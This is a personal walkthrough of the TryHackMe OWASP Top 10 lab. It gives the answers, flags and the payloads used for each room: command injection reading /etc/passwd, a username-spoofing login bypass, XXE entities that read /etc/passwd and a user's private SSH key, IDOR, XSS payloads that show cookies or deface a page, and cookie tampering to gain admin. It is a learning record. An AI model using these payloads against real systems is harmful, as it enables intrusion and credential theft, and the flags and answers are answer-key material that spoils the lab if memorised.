# TryHackMe OWASP top 10
#Pentesting #TryHackMe #OWASP

## 1. Command Injection. I was given a website in W.I.P that allowed me to run commands
-  What strange text file is in the website root directory? 
	
	`ls`
	
	**dr.pepper.txt**
	
- How many non-root/non-service/non-daemon users are there?
	
	`cat /etc/passwd`
	
	**0**
- What user is this app running as?
	
	`whoami`
	
	**www-data**
- What is the user's shell set as?

	`getent passwd `
	
	**/usr/sbin/nologin**
- What version of Ubuntu is running?
	
	`lsb_release -d`

	**18.04.4**
- Print out the MOTD.  What favorite beverage is shown?

	`cat /etc/update-motd.d/00-header`
	
	**Dr Pepper**
		
## 2.  Broken Authentication
-  What is the flag that you found in darren's account? 

	Create an account called darren with a space before and I should be able to login as darren 
	
	**FLAG: fe86079416a21a3c99937fea8874b667**
- Now try to do the same trick and see if you can login as arthur.

	Same as before create an account called arthur with a space before the name

	**FLAG: d9ac0f7db4fda460ac3edeb75d75e16e**
## 3. Sensitive Data Exposure
- What is the name of the mentioned directory? 

	I viewed the page source and found that the assets page was viewable
	
	** /assets**
- Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?

	**webapp.db**
	
- Use the supporting material to access the sensitive data. What is the password hash of the admin user?

	I downloaded the DB and opened it with
	
	`sqlite3 webapp.db`
	
	`.tables`
	
	`select * from users`
	
	**HASH: 6eea9b7ef19179a06954edd0f6c05ceb**
- Crack the hash. What is the admin's plaintext password?

	Went to free password crasher and got 
	
	**qwertyuiop**
- Login as the admin. What is the flag?

	**THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}** 
## 4. XML External Entity - eXtensible Markup Language 
- Full form of XML

	**Extensible Markup Language**
- Is it compulsory to have XML prolog in XML documents?

	**NO**
- Can we validate XML documents against a schema?

	**YES**
- How can we specify XML version and encoding in XML document?

	**XML prolog**
	
### 4.1. XML External Entity - DTD
-  How do you define a new ELEMENT? 
	
	**!ELEMENT**
- How do you define a ROOT element?
	
	**!DOCTYPE**
- How do you define a new ENTITY?

	** ENTITY **
### 4.2. XML External Entity - XXE Payload 
- 1st Payload tried
	
	```
	<!DOCTYPE replace [<!ENTITY name "feast"> ]>
 	<userInfo>
  		<firstName>falcon</firstName>
  		<lastName>&name;</lastName>
 	</userInfo>
	 ```
	 GOT
 
	 ** FALCON FEAST**
- 2nd Payload tried.
	```
	<?xml version="1.0"?>
	<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
	<root>&read;</root>
	```
	**Got the content of /etc/passwd**

## 4.3 XML External Entity - Exploiting 
-  Try to display your own name using any payload. 
	```
	<!DOCTYPE replace [<!ENTITY name "Bar"> ]>
 	<userInfo>
  		<firstName>Foo</firstName>
  		<lastName>&name;</lastName>
 	</userInfo>
	```
- See if you can read the /etc/passwd
	```
	<?xml version="1.0"?>
	<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
	<root>&read;</root>
	```
- What is the name of the user in /etc/passwd
	
	**falcon**
- Where is falcon´s SSH key located?

	Default ssh key location but for this users
	
	**/home/falcon/.ssh/id_rsa**
- What are the first 18 characters for falcon's private key?
	 ```
 	<?xml version="1.0"?>
	<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///home/falcon/.ssh/id_rsa'>]>
	<root>&read;</root>
	 ```
	**MIIEogIBAAKCAQEA7**
## 5. Broken Acess Control
### 5.1. Broken Access Control (IDOR Challenge) 
- Look at other users notes. What is the flag?
	
	Change url paramater from http://10.10.153.253/note.php?note=1 to http://10.10.153.253/note.php?note=0
	
	**flag{fivefourthree}**
## 6. Security Misconfiguration
- Hack into the webapp, and find the flag!
	Simple web app to take notes, I found a hint that tells me to look at their source code, I went on google and couldnt find anything worth checking, after that I went to github and found the webapp source, there was a page with default login credentials, I used them and it worked
	
	**thm{4b9513968fd564a87b28aa1f9d672e17}**
	## 7. Cross-site Scripting
- Navigate to http://10.10.247.239/ in your browser and click on the "Reflected XSS" tab on the navbar; craft a reflected XSS payload that will cause a popup saying "Hello".

	`<script>alert("Hello")</script>`
	
	**ThereIsMoreToXSSThanYouThink**
- On the same reflective page, craft a reflected XSS payload that will cause a popup with your machines IP address.

	`<script>alert(window.location.hostname)</script>`
	
	**ReflectiveXss4TheWin**
- Go to stored xss and add a comment and see if you can insert some of your own HTML.

	`<h1>Hello</h1>`
	
	**HTML_T4gs**
- On the same page, create an alert popup box appear on the page with your document cookies.
	
	`<script>alert(document.cookie)</script>`
	
	**W3LL_D0N3_LVL2**
- Change "XSS Playground" to "I am a hacker" by adding a comment and using Javascript.

	`<script>document.querySelector('#thm-title').textContent = 'I am a hacker'</script>`
	
	**websites_can_be_easily_defaced_with_xss**
## 8. Insecure Deserialization
-  Who developed the Tomcat application?
	
	**The Apache Software Foundation**
	
- What type of attack that crashes services can be performed with insecure deserialization?

	**Denial of Service**
### 8.1. Insecure Deserialization - Objects
A prominent element of object-oriented programming (OOP), objects are made up of two things:
> State

>Behaviour

- If a dog is sleeping, this would be :

	**A behaviour**
### 8.2 Insecure Deserialization - Deserialization 
Serialisation is the process of converting objects used in programming into simpler, compatible formatting for transmitting between systems or networks for further processing or storage.

-  What is the name of the base-2 formatting that data is sent across a network as?  

	**Binary**
### Insecure Deserialization - Cookies
- If a cookie had the path of webapp.com/login , what would the URL that the user has to visit be?
	
	**webapp.com/login**
- What is the acronym for the web technology that Secure cookies work over?

	**HTTPS**
-  1st flag (cookie value) 

	Go to base 64 decode and input the base64 encoded session type
	
	**THM{good_old_base64_huh}**
- 2nd flag (admin dashboard)

	Change usertype to admin
	
	**THM{heres_the_admin_flag}**

# 9. Components With Known Vulnerabilities
- Basically see what compoments and version the website is running and look for exploits for the versions used on exploit-db etc..